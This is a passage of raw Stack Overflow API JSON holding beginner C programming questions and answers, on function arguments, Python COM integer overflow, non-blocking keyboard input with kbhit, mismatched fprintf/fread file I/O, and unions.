<strong>Remove the <code>answer</code> argument.</strong></li>\n<li>You redefine <code>answer</code> as local variable. After removing the argument of the same name, that redefinition goes away. But in that case you should return <code>answer</code> instead of <code>0</code>. You could even do without the intermediary variable <code>answer</code> and return the result expression. So: <strong>Return the desired expression</strong></li>\n<li>The answer depends on two global variables. The function should work on two angles that you pass as arguments. <strong>Provide two angle arguments to your function and remove the global variables.</strong></li>\n<li>And finally, the sum of the three angles in a triangle is 180\u00b0, so your remaining angle calculation is wrong.</li>\n</ul>\n\n<p>Putting all that together:</p>\n\n<pre><code>float remainingAngle(float a, float b)\n{\n    return 180.0f - a - b;\n}\n</code></pre>\n\n<p>and call it like this:</p>\n\n<pre><code>float angleC = remainingAngle(angleA, angleB);\n</code></pre>\n\n<blockquote>\n  <p>Im used to java</p>\n</blockquote>\n\n<p>I'm not too familiar with Java, but I don't think functios on scalars like this one are fundamentally different in C and Java.</p>\n"}], "owner": {"reputation": 11, "user_id": 4119554, "user_type": "registered", "profile_image": "https://graph.facebook.com/1279992956/picture?type=large", "display_name": "Ethan Cole Merbaum", "link": "https://stackoverflow.com/users/4119554/ethan-cole-merbaum"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4243, "favorite_count": 0, "accepted_answer_id": 31559992, "answer_count": 3, "score": -5, "last_activity_date": 1437566241, "creation_date": 1437559317, "last_edit_date": 1437566119, "question_id": 31559929, "link": "https://stackoverflow.com/questions/31559929/too-many-arguments-to-function-call-what-do-i-do", "title": "Too many arguments to function call, What do I do?", "body": "<p>I am working on a problem in my textbook and I need to make a triangle angle calculator Im used to java but Im not 100% on C yet, I don't understand the logic in it.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nstatic float angleB;\nstatic float angleA;\n\nfloat remainingAngle(float answer)\n{\n    float answer= angleA+angleB;\n//redefinition of answer\n return 0;\n}\n//CANT TOUCH FROM HERE TO END\nint main(int argc, const char * argv[]) {\n    float angleA = 30.0;\n    float angleB = 60.0;\n    float angleC = remainingAngle(angleA,angleB);\n// to many arguments to function call (referring to angleC)\n    printf(\"the third angle is %.2f\\n\",angleC);\n    return 0;\n}     //END CANT TOUCH\n</code></pre>\n\n<p>I don't know what to do here.</p>\n"}, {"tags": ["python", "c", "idl"], "answers": [{"comments": [{"owner": {"reputation": 667, "user_id": 3656018, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/4628dadfea3655343888679dda06bf2b?s=128&d=identicon&r=PG&f=1", "display_name": "keerthee", "link": "https://stackoverflow.com/users/3656018/keerthee"}, "edited": false, "score": 0, "creation_date": 1437561836, "post_id": 31559934, "comment_id": 51077561, "body": "Yeah You are right, I dint realize whether it is signed or not"}], "tags": [], "owner": {"reputation": 8286, "user_id": 533037, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/f711473fb27cd269ba5ad2064c15dcd3?s=128&d=identicon&r=PG", "display_name": "solidpixel", "link": "https://stackoverflow.com/users/533037/solidpixel"}, "is_accepted": true, "score": 2, "last_activity_date": 1437559325, "creation_date": 1437559325, "answer_id": 31559934, "question_id": 31559831, "link": "https://stackoverflow.com/questions/31559831/python-int-too-large-to-convert-to-c-long-in-python-com/31559934#31559934", "title": "Python int too large to convert to C long in Python COM", "body": "<p>The \"long\" C type is signed so the largest positive value it can store is 2,147,483,647. The error is indeed correct, it doesn't fit.</p>\n\n<p>Try \"unsigned long\" and \"UL\" postfix on the constant.</p>\n"}], "owner": {"reputation": 667, "user_id": 3656018, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/4628dadfea3655343888679dda06bf2b?s=128&d=identicon&r=PG&f=1", "display_name": "keerthee", "link": "https://stackoverflow.com/users/3656018/keerthee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 832, "favorite_count": 0, "accepted_answer_id": 31559934, "answer_count": 1, "score": 0, "last_activity_date": 1437559325, "creation_date": 1437559066, "question_id": 31559831, "link": "https://stackoverflow.com/questions/31559831/python-int-too-large-to-convert-to-c-long-in-python-com", "title": "Python int too large to convert to C long in Python COM", "body": "<p>I have a python method that calculates value and returns it. \nThe value is </p>\n\n<pre><code>CalcData = 3941269503L. \n</code></pre>\n\n<p>It is only 32 bit. Yet this is typecasted to long implicitly (suffixed by L) and when I access this method in COM in other application , I get the Python int too large to convert to C long error. I even tried typecasting it into int,but no luck</p>\n"}, {"tags": ["c", "user-input", "scanf", "clock", "getchar"], "comments": [{"owner": {"reputation": 16263, "user_id": 814761, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/030202f384a132247f144ee2b8f809ae?s=128&d=identicon&r=PG", "display_name": "Purag", "link": "https://stackoverflow.com/users/814761/purag"}, "edited": false, "score": 2, "creation_date": 1437558346, "post_id": 31559511, "comment_id": 51075137, "body": "Some basic code from this program you wrote would be very helpful. :)"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437558665, "post_id": 31559511, "comment_id": 51075384, "body": "Welcome to Stack Overflow! Please take the <a href=\"http://stackoverflow.com/tour\">tour</a> and read <a href=\"http://stackoverflow.com/help/how-to-ask\">How to Ask</a> to learn what we expect from questions here. Please show us what you&#39;ve tried already, how it failed and we might be able to help.:-)"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 2, "creation_date": 1437558677, "post_id": 31559511, "comment_id": 51075396, "body": "Not in the C standard. You need to use platform-specific APIs or third-party libraries."}, {"owner": {"reputation": 177, "user_id": 4947915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64026446d9be5d4c5381055badc2943e?s=128&d=identicon&r=PG", "display_name": "Rohan Gayen", "link": "https://stackoverflow.com/users/4947915/rohan-gayen"}, "edited": false, "score": 0, "creation_date": 1437658798, "post_id": 31559511, "comment_id": 51130004, "body": "Can you refer to any such API or library? I am using windows."}], "answers": [{"tags": [], "owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "is_accepted": false, "score": 3, "last_activity_date": 1437558684, "creation_date": 1437558684, "answer_id": 31559689, "question_id": 31559511, "link": "https://stackoverflow.com/questions/31559511/optional-input-in-c/31559689#31559689", "title": "Optional input in C", "body": "<p>No. Classic IO is synchronous, which means requesting a line will block your program (you won't be able to do anything--the scheduler will skip you) until the line is read.</p>\n\n<p>Signals were designed for what you want. On Unix,\n<code>Ctrl-\\</code> (send the foreground process the quit signal) will make the program quit. \n<code>Ctrl-c</code> (send the foreground process the interrupt signal) will more often than not result in an exit as well.</p>\n\n<p>Exiting is the default reaction to receiving most signals, but you can handle signals differently, and then they serve as a kind of asynchronous input.</p>\n"}, {"comments": [{"owner": {"reputation": 177, "user_id": 4947915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64026446d9be5d4c5381055badc2943e?s=128&d=identicon&r=PG", "display_name": "Rohan Gayen", "link": "https://stackoverflow.com/users/4947915/rohan-gayen"}, "edited": false, "score": 0, "creation_date": 1437659109, "post_id": 31559709, "comment_id": 51130277, "body": "Kbhit did the job but I can&#39;t compile the code in dev-c, it only works in turbo-c. Then what is the remedy?"}, {"owner": {"reputation": 151, "user_id": 5104949, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3R6eh.png?s=128&g=1", "display_name": "Vlad Alex", "link": "https://stackoverflow.com/users/5104949/vlad-alex"}, "reply_to_user": {"reputation": 177, "user_id": 4947915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64026446d9be5d4c5381055badc2943e?s=128&d=identicon&r=PG", "display_name": "Rohan Gayen", "link": "https://stackoverflow.com/users/4947915/rohan-gayen"}, "edited": false, "score": 0, "creation_date": 1437755055, "post_id": 31559709, "comment_id": 51180249, "body": "As some of the people mentioned it&#39;s not part of the C standard so not all dev environments have it. If you develop in Linux you may try using the kbhit() implementation from this <a href=\"http://cboard.cprogramming.com/c-programming/63166-kbhit-linux.html\" rel=\"nofollow noreferrer\">thread</a> (check the second post)"}], "tags": [], "owner": {"reputation": 151, "user_id": 5104949, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3R6eh.png?s=128&g=1", "display_name": "Vlad Alex", "link": "https://stackoverflow.com/users/5104949/vlad-alex"}, "is_accepted": false, "score": 1, "last_activity_date": 1437558750, "creation_date": 1437558750, "answer_id": 31559709, "question_id": 31559511, "link": "https://stackoverflow.com/questions/31559511/optional-input-in-c/31559709#31559709", "title": "Optional input in C", "body": "<p>You may use <code>kbhit</code> function from <code>&lt;conio.h&gt;</code></p>\n\n<pre><code>#include &lt;conio.h&gt;\n\n...\n\nwhile( !kbhit() )\n{\n     /* update clock */\n     ...\n\n}\n</code></pre>\n\n<p><code>kbhit()</code> returns non-zero value if there is a key in the keyboard buffer, and zero otherwise.</p>\n"}, {"tags": [], "owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "is_accepted": false, "score": 1, "last_activity_date": 1437558884, "creation_date": 1437558884, "answer_id": 31559761, "question_id": 31559511, "link": "https://stackoverflow.com/questions/31559511/optional-input-in-c/31559761#31559761", "title": "Optional input in C", "body": "<p>Generally speaking, standard C (scanf(), getchar() etc.) uses line-buffered input. Whatever the user enters on the terminal does not actually get passed to the program until the user presses ENTER.</p>\n\n<p>There are functions that <em>do</em> query key presses without buffering, but they are not part of the standard library. There is <a href=\"http://linux.die.net/man/3/getch\" rel=\"nofollow\"><code>getch()</code></a> on Unixes from <code>&lt;curses.h&gt;</code>, and <a href=\"https://msdn.microsoft.com/en-us/library/078sfkak.aspx\" rel=\"nofollow\"><code>_getch()</code></a> from Windows' <code>&lt;conio.h&gt;</code>, for example.</p>\n\n<p>Or the user could simply use <code>&lt;Ctrl&gt;-c</code> to exit the program...</p>\n"}, {"comments": [{"owner": {"reputation": 177, "user_id": 4947915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64026446d9be5d4c5381055badc2943e?s=128&d=identicon&r=PG", "display_name": "Rohan Gayen", "link": "https://stackoverflow.com/users/4947915/rohan-gayen"}, "edited": false, "score": 0, "creation_date": 1437562003, "post_id": 31559849, "comment_id": 51077684, "body": "I am using windows, how can user enter command? At this moment I can only close the program by pressing close button at tge upper right hand corner of the Dos window but I want to close the program within the program."}], "tags": [], "owner": {"reputation": 183, "user_id": 5036660, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/63f06149f343389d067d2d93ce2a8ebc?s=128&d=identicon&r=PG&f=1", "display_name": "Xcrowzz", "link": "https://stackoverflow.com/users/5036660/xcrowzz"}, "is_accepted": false, "score": 0, "last_activity_date": 1437559120, "creation_date": 1437559120, "answer_id": 31559849, "question_id": 31559511, "link": "https://stackoverflow.com/questions/31559511/optional-input-in-c/31559849#31559849", "title": "Optional input in C", "body": "<p>It might be tricky, but\nYou could make an infinite loop while reading on the standard input, and when the user enters the exit command, you return 0 to end it ? </p>\n"}, {"comments": [{"owner": {"reputation": 177, "user_id": 4947915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64026446d9be5d4c5381055badc2943e?s=128&d=identicon&r=PG", "display_name": "Rohan Gayen", "link": "https://stackoverflow.com/users/4947915/rohan-gayen"}, "edited": false, "score": 0, "creation_date": 1437659086, "post_id": 31561830, "comment_id": 51130261, "body": "Kbhit did the job but I can&#39;t compile the code in dev-c, it only works in turbo-c. Then what is the remedy?"}, {"owner": {"reputation": 353, "user_id": 4446712, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/100001082593799/picture?type=large", "display_name": "Subhajit Kundu", "link": "https://stackoverflow.com/users/4446712/subhajit-kundu"}, "reply_to_user": {"reputation": 177, "user_id": 4947915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64026446d9be5d4c5381055badc2943e?s=128&d=identicon&r=PG", "display_name": "Rohan Gayen", "link": "https://stackoverflow.com/users/4947915/rohan-gayen"}, "edited": false, "score": 0, "creation_date": 1442910390, "post_id": 31561830, "comment_id": 53266384, "body": "You&#39;re right. kbhit has portability issues. You have it defined in library conio.h. You will have to implement an equivalent in Linux. A common use of kbhit function is to test when the user has pressed a key in an interactive console application.  It does not consume the character and does not block. POSIX (and therefore Linux) lacks a similar function. Although it does not directly support this functionality, the GNU Curses library can be used to implement _kbhit() on Linux. Study of curses.h and ncurses.h should help. I have shared a link in last comment with a dummy implementation."}], "tags": [], "owner": {"reputation": 353, "user_id": 4446712, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/100001082593799/picture?type=large", "display_name": "Subhajit Kundu", "link": "https://stackoverflow.com/users/4446712/subhajit-kundu"}, "is_accepted": false, "score": 2, "last_activity_date": 1437564550, "creation_date": 1437564550, "answer_id": 31561830, "question_id": 31559511, "link": "https://stackoverflow.com/questions/31559511/optional-input-in-c/31561830#31561830", "title": "Optional input in C", "body": "<p>I assume you actually want to wait for user input and run the clock meanwhile. If you receive any such input you want to act on it else keep running the clock. What happens when you use scanf/get char is it keeps waiting till there is actually a keyboard input. (getchar is more reactive than scanf. getchar will return with every key hit. Scanf will wait till enter is pressed.) What you actually want is logic that \"if there is any key hit\". kbhit is the answer for you. Your program will look something like following:</p>\n\n<pre><code>#include &lt;conio.h&gt;\n...\nwhile(1) {\n    if ( kbhit() ) {\n        // Read the user input and act on it.\n    } else {\n        // Update the clock.\n    }\n}\n...\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 177, "user_id": 4947915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64026446d9be5d4c5381055badc2943e?s=128&d=identicon&r=PG", "display_name": "Rohan Gayen", "link": "https://stackoverflow.com/users/4947915/rohan-gayen"}, "edited": false, "score": 0, "creation_date": 1437658976, "post_id": 31588616, "comment_id": 51130174, "body": "I can&#39;t get your point, can you please explain what do you mean by &#39;raw mode&#39;?"}], "tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1437657630, "creation_date": 1437657630, "answer_id": 31588616, "question_id": 31559511, "link": "https://stackoverflow.com/questions/31559511/optional-input-in-c/31588616#31588616", "title": "Optional input in C", "body": "<p>The program could</p>\n\n<pre><code>1) set the console to 'raw' mode\n2) set a interrupt handler for the keyboard inputs\n3) the interrupt handler sets a global flag\n4) the main/clock update function, on each loop,\n   looks at the global flag and if the global flag is set, exits\n</code></pre>\n"}], "owner": {"reputation": 177, "user_id": 4947915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64026446d9be5d4c5381055badc2943e?s=128&d=identicon&r=PG", "display_name": "Rohan Gayen", "link": "https://stackoverflow.com/users/4947915/rohan-gayen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 582, "favorite_count": 0, "answer_count": 6, "score": 2, "last_activity_date": 1437657630, "creation_date": 1437558239, "question_id": 31559511, "link": "https://stackoverflow.com/questions/31559511/optional-input-in-c", "title": "Optional input in C", "body": "<p>I was trying to write a digital clock program where I faced that problem. I want to give user the choice to exit the program, but whatever input function I use(scanf, getchar etc) the program stops until I enter an input(either yes or no) as well as the clock stops. This is not intended, the clock should run as long as user wants to exit. \nIs there any way in C to make input optional to the user?</p>\n"}, {"tags": ["c", "linux", "file", "parsing", "struct"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437558093, "post_id": 31559406, "comment_id": 51074980, "body": "try formatted reading... like  <code>fscanf()</code>."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437558168, "post_id": 31559406, "comment_id": 51075024, "body": "also, what is the purpose of the very first file?"}, {"owner": {"reputation": 91, "user_id": 3145350, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/a3d8f37f5596ddff857a05f321c6aaba?s=128&d=identicon&r=PG&f=1", "display_name": "user3145350", "link": "https://stackoverflow.com/users/3145350/user3145350"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437558298, "post_id": 31559406, "comment_id": 51075102, "body": "@SouravGhosh First file is the text file from where i have to read the values. and also tryed fscanf but not getting the exact output"}, {"owner": {"reputation": 6115, "user_id": 2339452, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FvFTP.jpg?s=128&g=1", "display_name": "Dayal rai", "link": "https://stackoverflow.com/users/2339452/dayal-rai"}, "edited": false, "score": 1, "creation_date": 1437558481, "post_id": 31559406, "comment_id": 51075240, "body": "i am not sure but perhaps a <code>rewind(fp);</code> is required before <code>fread</code>."}, {"owner": {"reputation": 2027, "user_id": 270654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6db8e6e1cf36dfcc4c4d59e4b5827344?s=128&d=identicon&r=PG", "display_name": "nemetroid", "link": "https://stackoverflow.com/users/270654/nemetroid"}, "edited": false, "score": 2, "creation_date": 1437559320, "post_id": 31559406, "comment_id": 51075855, "body": "You&#39;re writing a textual representation (with fptrinf) of your struct but attempting to read a binary representation (with fread)."}], "answers": [{"comments": [{"owner": {"reputation": 475, "user_id": 5118690, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a19269e7a06347dfe2c3a7e81d8d2df5?s=128&d=identicon&r=PG&f=1", "display_name": "Missu", "link": "https://stackoverflow.com/users/5118690/missu"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1437565486, "post_id": 31560445, "comment_id": 51079998, "body": "Yes, I make an error by saying a = 0x3442 instead of 0x3432 (and I&#39;ve forgotten the endianness). Step by step with GDB show me that a=0x3234."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1437565668, "post_id": 31560445, "comment_id": 51080108, "body": "Nice ,using debugger ."}], "tags": [], "owner": {"reputation": 475, "user_id": 5118690, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a19269e7a06347dfe2c3a7e81d8d2df5?s=128&d=identicon&r=PG&f=1", "display_name": "Missu", "link": "https://stackoverflow.com/users/5118690/missu"}, "is_accepted": false, "score": 2, "last_activity_date": 1437564942, "last_edit_date": 1437564942, "creation_date": 1437560755, "answer_id": 31560445, "question_id": 31559406, "link": "https://stackoverflow.com/questions/31559406/getting-garbage-value-in-structure-when-reading-from-file/31560445#31560445", "title": "Getting garbage value in structure when reading from file", "body": "<p>Like say nemetroid : </p>\n\n<blockquote>\n  <p>You're writing a textual representation (with\n  fptrinf) of your struct but attempting to read a binary representation\n  (with fread).</p>\n</blockquote>\n\n<p>For example, suppose you want write an int in a file. By doing like this :</p>\n\n<pre><code>   fd = fopen(\"file\",\"a+\");\n   fprintf(fd,\"%d\",42);\n</code></pre>\n\n<p>You will write the character '4' and the character '2'. In ASCII, '4' is 0x34 and '2' is 0x32. \nIf you want to read that file and try to put it in an 4 bytes integer by doing like this :</p>\n\n<pre><code>int a = 0;\nfread(&amp;a,sizeof(a),1,fd);\n</code></pre>\n\n<p>The variable 'a' will contain the data on the file :</p>\n\n<pre><code>a = 0x00003234\n</code></pre>\n\n<p>And not 42 (0x0000002a) as you expect.</p>\n"}, {"tags": [], "owner": {"reputation": 50, "user_id": 5137819, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-hW-_xZU6lXE/AAAAAAAAAAI/AAAAAAAAABM/bbWJ6EgPEVY/photo.jpg?sz=128", "display_name": "Mr Pudin", "link": "https://stackoverflow.com/users/5137819/mr-pudin"}, "is_accepted": false, "score": 0, "last_activity_date": 1437565014, "creation_date": 1437565014, "answer_id": 31561997, "question_id": 31559406, "link": "https://stackoverflow.com/questions/31559406/getting-garbage-value-in-structure-when-reading-from-file/31561997#31561997", "title": "Getting garbage value in structure when reading from file", "body": "<p>There were some calls that was missing from your code:</p>\n\n<ol>\n<li><code>fflush()</code>\n\n<ul>\n<li>Used to flush the file's buffer, you have to call this if you performed writes to the file and now you want to read</li>\n</ul></li>\n<li><code>fseek</code>\n\n<ul>\n<li>Used to set the file position indicator. In your case, the file position indicator was at the end of the file. Use <code>fseek()</code> to set the file position to where you started writing and than start reading.</li>\n</ul></li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 353, "user_id": 4446712, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/100001082593799/picture?type=large", "display_name": "Subhajit Kundu", "link": "https://stackoverflow.com/users/4446712/subhajit-kundu"}, "is_accepted": false, "score": 0, "last_activity_date": 1437565060, "creation_date": 1437565060, "answer_id": 31562010, "question_id": 31559406, "link": "https://stackoverflow.com/questions/31559406/getting-garbage-value-in-structure-when-reading-from-file/31562010#31562010", "title": "Getting garbage value in structure when reading from file", "body": "<p>fscanf function corresponds to fprintf. fread corresponds to fwrite. It means if you want to dump the structure using fprintf, then read it using fscanf. if you want to read the structure using fread then dump it using fwrite. Referring manpages of these functions should help.</p>\n"}], "owner": {"reputation": 91, "user_id": 3145350, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/a3d8f37f5596ddff857a05f321c6aaba?s=128&d=identicon&r=PG&f=1", "display_name": "user3145350", "link": "https://stackoverflow.com/users/3145350/user3145350"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 843, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1437565060, "creation_date": 1437557991, "question_id": 31559406, "link": "https://stackoverflow.com/questions/31559406/getting-garbage-value-in-structure-when-reading-from-file", "title": "Getting garbage value in structure when reading from file", "body": "<p>I have a text file like this </p>\n\n<pre><code>987jgkfl\n12358ldjkdju\n7579jngj\n8uuujkl\n09698fjfj\n</code></pre>\n\n<p>I have a structure like this </p>\n\n<pre><code>struct emprec\n\n{\n\n    int empid;\n    int todo;\n    char name[20];\n\n};\n</code></pre>\n\n<p>I write the values of the struct into file like this </p>\n\n<pre><code>fd = fopen(\"/home/tarun/Desktop/test34.txt\",\"a+\");\n    fprintf(fd,\"%d\",temp2.empid);\n    fprintf(fd,\"%s\",temp2.name);\n    count++;\n    fclose(fd);\n</code></pre>\n\n<p>But when i read from the file i am getting the garbage value</p>\n\n<pre><code>while(i&lt;=count)\n{\nfread(&amp;temp5,sizeof(temp5),1,fd);\n//fscanf(fd,\"%d,%s\",&amp;temp5.empid,temp5.name);\n//int k = strlen(temp5.name);\n//printf(\"Value of k is %d\\n\",k);\n//temp5.name[7]= '\\0';\n//fread(&amp;temp5.empid,sizeof(temp5.empid),1,fd);\n//fread(temp5.name,20,1,fd);\nprintf(\"\\n%d %s\",temp5.empid,temp5.name);\ni++;\n}\nfclose(fd);\n</code></pre>\n\n<p>Please tell me where am i going wrong</p>\n"}, {"tags": ["c", "arrays", "data-structures", "unions"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1437557821, "post_id": 31559319, "comment_id": 51074783, "body": "<code>int array[7] = Byte1;</code>...what exactly you want?"}, {"owner": {"reputation": 6115, "user_id": 2339452, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FvFTP.jpg?s=128&g=1", "display_name": "Dayal rai", "link": "https://stackoverflow.com/users/2339452/dayal-rai"}, "edited": false, "score": 1, "creation_date": 1437557880, "post_id": 31559319, "comment_id": 51074820, "body": "There is something very wrong with basic syntax of <code>C</code>."}, {"owner": {"reputation": 4031, "user_id": 1916721, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/xBXSE.png?s=128&g=1", "display_name": "carloabelli", "link": "https://stackoverflow.com/users/1916721/carloabelli"}, "edited": false, "score": 2, "creation_date": 1437558073, "post_id": 31559319, "comment_id": 51074965, "body": "<a href=\"http://www.tutorialspoint.com/cprogramming/c_unions.htm\" rel=\"nofollow noreferrer\">Unions</a> can only hold one value at a time so you are basically corrupting all data to set it all to <code>z&gt;0</code>"}, {"owner": {"reputation": 11, "user_id": 1027278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf5c1c8f529382f17e1118b729668184?s=128&d=identicon&r=PG", "display_name": "Hegde", "link": "https://stackoverflow.com/users/1027278/hegde"}, "edited": false, "score": 0, "creation_date": 1437558076, "post_id": 31559319, "comment_id": 51074967, "body": "As mentioned, I want to write value of union to array element"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437558205, "post_id": 31559319, "comment_id": 51075045, "body": "<code>int array[7] </code> is not an <b>array element</b>. What you&#39;re upto?"}, {"owner": {"reputation": 11, "user_id": 1027278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf5c1c8f529382f17e1118b729668184?s=128&d=identicon&r=PG", "display_name": "Hegde", "link": "https://stackoverflow.com/users/1027278/hegde"}, "edited": false, "score": 0, "creation_date": 1437558421, "post_id": 31559319, "comment_id": 51075188, "body": "Hi Sourav, sorry for wrong representation.. I want to write byte1 to 7th element of array.. (array is of int type)"}, {"owner": {"reputation": 4127, "user_id": 4231385, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d89a541a4609cafea3957e4cdfcca50f?s=128&d=identicon&r=PG&f=1", "display_name": "cremno", "link": "https://stackoverflow.com/users/4231385/cremno"}, "edited": false, "score": 1, "creation_date": 1437558731, "post_id": 31559319, "comment_id": 51075430, "body": "Please don&#39;t use <code>int</code> bit-fields as they can be either signed or unsigned (yes!). Use <code>unsigned int a : 1</code> to store either 0 or 1."}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1437560638, "post_id": 31559319, "comment_id": 51076782, "body": "Are you sure that you want to use <code>union</code> and not <code>struct</code>?"}, {"owner": {"reputation": 617, "user_id": 1286717, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DQrBG.jpg?s=128&g=1", "display_name": "Alexander Amelkin", "link": "https://stackoverflow.com/users/1286717/alexander-amelkin"}, "edited": false, "score": 0, "creation_date": 1437570141, "post_id": 31559319, "comment_id": 51083429, "body": "Honestly, storing a boolean value in a variable called Byte but having a size of 4 bytes is... ehm... weird.  What&#39;s the use of using a union in this particular case, by the way? Did you mean to use a struct instead?"}], "answers": [{"tags": [], "owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "is_accepted": false, "score": 0, "last_activity_date": 1437559717, "last_edit_date": 1437559717, "creation_date": 1437558743, "answer_id": 31559707, "question_id": 31559319, "link": "https://stackoverflow.com/questions/31559319/how-to-write-union-value-to-an-array-element-in-c/31559707#31559707", "title": "How to write union value to an array element in C?", "body": "<p>As you said </p>\n\n<blockquote>\n  <p>Whole content of union I need to write to an array element int\n  array[7] = Byte1;</p>\n</blockquote>\n\n<p>But You can define a union with many members, but only one member can contain a value at any given time. So whole contain is not possible to store. Store only one Required value in your array.  or you can do like this </p>\n\n<pre><code>array[7] = Byte1.a;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2575, "user_id": 4711812, "user_type": "registered", "accept_rate": 75, "profile_image": 